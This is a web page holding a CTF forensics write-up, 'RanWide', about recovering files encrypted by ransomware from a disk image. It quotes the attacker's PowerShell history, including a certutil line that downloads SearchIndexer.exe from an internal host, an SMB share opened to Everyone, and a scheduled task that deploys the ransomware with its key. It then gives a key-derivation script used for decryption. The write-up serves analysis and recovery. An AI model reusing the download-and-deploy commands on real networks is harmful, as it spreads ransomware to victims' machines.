@@ -1,0 +1,265 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-12-02-blackhat-mea-ctf-final-2025/ranwide.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>RanWide - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#ranwide" class="nav-link">RanWide</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="ranwide">RanWide</h1>
+<p>Co-authors: @Eki, @Xyzst</p>
+<p>We are given two <code>.E01</code> files. We focus on the second one:</p>
+<pre class="highlight"><code class="language-shell">7z x RanWide.zip
+cd artifacts
+mkdir shr-srv01-mnt
+ewfmount shr-srv01.E01 shr-srv01-mnt
+cp shr-srv01-mnt/ewf1 shr-srv01.img
+sudo losetup -P -f shr-srv01.img
+mkdir mnt
+sudo mount -o ro /dev/loop1 mnt</code></pre>
+<p>@eki found clues in <code>Users/tcollins/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt</code> from the ransomware:</p>
+<pre class="highlight"><code class="language-shell">New-Item -Path "C:\Deployment" -ItemType Directory
+New-SmbShare -Name "Deploy" -Path "C:\Deployment" -FullAccess "Everyone" -Description "Deployment Scripts"
+certutil.exe -urlcache -f "http://10.3.90.1/SearchIndexer.exe" "C:\Users\Public\Documents\SearchIndexer.exe"
+Copy-Item -Path "C:\Users\Public\Documents\SearchIndexer.exe" -Destination "\\SHR-SRV01\Deploy\SearchIndexer.exe"</code></pre>
+<p>We decompiled the ransomware and discovered its logic (contributed by @Xyzst):</p>
+<ol>
+<li>Read a 32-byte key from argv</li>
+<li>Compute its SHA256 for salt, use PBKDF2 to derive the key, then compute the IV using SHA256 of the key and salt</li>
+<li>Use AES-CTR to encrypt/decrypt files</li>
+</ol>
+<p>The 32 byte key can be found in <code>ProgramData/Microsoft/Group Policy/History/{DF23E480-0AAB-4A4A-8480-E1AF6E5F00EB}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml</code>:</p>
+<pre class="highlight"><code class="language-xml">&lt;Command&gt;\\SHR-SRV01\Deploy\SearchIndexer.exe &lt;/Command&gt;
+&lt;Arguments&gt;&amp;quot;7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&amp;amp;&amp;quot;&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;&lt;/Properties&gt;&lt;/ImmediateTaskV2&gt;&lt;/ScheduledTasks&gt;</code></pre>
+<p>So the argument is <code>7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&amp;</code>. Then, we can find the key and iv.</p>
+<p>Script by @Xyzst:</p>
+<pre class="highlight"><code class="language-python">import hashlib
+from binascii import hexlify
+import sys
+
+def pbkdf2_hmac_sha256(password, salt, iterations, dklen):
+    return hashlib.pbkdf2_hmac('sha256', password, salt, iterations, dklen)
+
+password_str = "7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&amp;"
+password_bytes = password_str.encode('utf-8')
+
+# 1. Generate Salt: First 8 bytes of SHA256(password)
+sha256_pass = hashlib.sha256(password_bytes).digest()
+salt = sha256_pass[:8]
+
+# 2. Derive Key: PBKDF2(pass, salt, 1000, 32)
+key = pbkdf2_hmac_sha256(password_bytes, salt, 1000, 32)
+
+# 3. Derive IV: SHA256(password + salt)[:16]
+iv_buffer = password_bytes + salt
+iv_hash = hashlib.sha256(iv_buffer).digest()
+iv = iv_hash[:16]
+
+print(f"Password: {password_str}")
+print(f"Length: {len(password_str)}")
+print(f"Salt: {hexlify(salt).decode()}")
+print(f"Key: {hexlify(key).decode()}")
+print(f"IV: {hexlify(iv).decode()}")</code></pre>
+<p>With the known key and IV, we can decrypt <code>./Users/tcollins/Desktop/flag.txt.r47m02d16</code>.</p>
+<p>Alternatively, we used a simpler approach (remember to back up your files on <code>C:\</code> first—we used Wine, so <code>~/.wine/drive_c</code> and <code>~/Downloads</code>, etc.):</p>
+<ol>
+<li>Copy <code>flag.txt.r47m02d16</code> to the <code>C:\</code> drive and rename it to remove the suffix</li>
+<li>Run <code>wine SearchIndexer.exe '7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&amp;'</code></li>
+<li>Due to how AES-CTR works, the encrypted file now contains the flag itself</li>
+</ol></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
